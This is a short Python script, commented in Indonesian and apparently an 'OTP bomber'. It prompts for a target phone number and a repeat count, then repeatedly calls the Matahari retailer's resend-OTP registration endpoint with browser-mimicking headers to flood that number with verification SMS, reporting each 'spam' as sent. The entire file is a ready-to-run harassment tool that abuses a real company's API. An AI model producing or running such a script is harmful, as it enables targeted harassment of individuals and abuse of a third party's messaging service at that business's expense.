import sys          #untuk fungsi pada terminal, seperti autoclick() dan exit()
import subprocess   #installing python module within code / script (tanpa requirements.txt)

try: #import Module
    import requests #POST, GET, & PUT URL API
    import time     #Untuk Informasi Waktu
    import random   #Untuk Random User
    import os       #Untuk "clear" pada terminal
    import urllib3  #Untuk HTTP Client pada python
    import json     #Agar body Request dapat dilihat dengan cara di print
    import base64   #Untuk variasi output
    import emot     #Untuk menambahkan emot
    import shutil
finally:
    import requests
    import urllib3
    from colorama import Fore,Back,init
    from requests import get,post
    from urllib import request
    from bs4 import BeautifulSoup as bs

from urllib3.exceptions import *
from bs4 import BeautifulSoup as bs
from pip._vendor.requests import post,get # Bisa langsung "from requests import post,get"

# Inisialisasi Variasi Warna Output Terminal.
hijau="\033[1;92m "
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="\033[1;91m"
biru="\033[1;96m"

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW

nomor = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Nomor Target (exp: 087809874541) {W}: ")
jum = int(input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Jumlah {W}: "))
for i in range(jum):
    MatahariOTP = requests.post("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp",headers={"Host":"www.matahari.com","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0","Accept":"application/json, text/javascript, */*; q=0.01","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","X-Newrelic-Id":"Vg4GVFVXDxAGVVlVBgcGVlY=","Content-Type":"application/json","X-Requested-With":"XMLHttpRequest","Content-Length":"27","Origin":"https://www.matahari.com","Dnt":"1","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin","Te":"trailers"},data=json.dumps({"otp_request":{"mobile_number":nomor,"mobile_country_code":"+62"}})).text
    respon = json.loads(MatahariOTP)
    if(respon['outcomeCode'] == 0):
        print (f"{W}[{G}✓{W}][{G}Success{W}] Success Sended Spam")
    else:
        print (f"{W}[{R}x{W}][{R}Failed{W}] Limit")